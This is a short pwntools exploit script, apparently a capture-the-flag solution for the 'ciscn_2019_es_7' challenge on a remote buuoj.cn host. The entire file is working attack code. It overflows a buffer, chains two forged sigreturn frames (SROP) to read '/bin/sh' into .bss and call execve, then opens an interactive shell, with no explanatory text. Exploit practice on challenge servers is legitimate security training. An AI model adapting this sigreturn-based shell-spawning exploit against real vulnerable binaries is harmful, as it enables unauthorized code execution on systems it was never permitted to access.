from pwn import *


# p = process("./ciscn_2019_es_7")
p = remote("node4.buuoj.cn", 26354)


# SROP
sigreturn = 0x04004DA
syscall = 0x0400517

context.arch = "amd64"
bss_addr = 0x0601030


frame1 = SigreturnFrame()
frame1.rax = 0x3b
frame1.rdi = bss_addr
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = syscall 

stack = b"/bin/sh\x00"+p64(sigreturn)+p64(syscall)+bytes(frame1)

frame2 = SigreturnFrame()
frame2.rax = 0
frame2.rdi = 0
frame2.rsi = bss_addr 
frame2.rdx = len(stack)
frame2.rip = syscall
frame2.rsp = bss_addr+0x8 

pad = cyclic(0x10)
pad += p64(sigreturn)+p64(syscall)+bytes(frame2)
p.send(pad)
p.send(stack)

p.interactive()


